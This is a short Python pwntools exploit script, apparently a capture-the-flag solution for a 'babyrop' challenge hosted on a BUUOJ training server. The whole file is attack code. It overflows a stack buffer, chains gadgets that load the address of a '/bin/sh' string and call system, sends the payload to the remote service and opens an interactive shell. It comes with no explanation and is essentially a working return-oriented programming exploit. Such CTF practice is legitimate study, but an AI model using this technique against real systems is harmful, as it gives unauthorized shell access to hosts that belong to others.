from pwn import *

#io = process('./babyrop')
io = remote('node4.buuoj.cn',27935)
#context.log_level = 'debug'
#raw_input()

binsh_addr = 0x601048
call_system = 0x4005E3
pop_rid = 0x400683
ret_addr = 0x400479

payload = b'\x61'*0x10 + b'\x62' * 8
payload += p64(pop_rid)
payload += p64(binsh_addr)
payload += p64(ret_addr)
payload += p64(call_system)

io.recvuntil(b'name? ')
io.sendline(payload)

io.interactive()
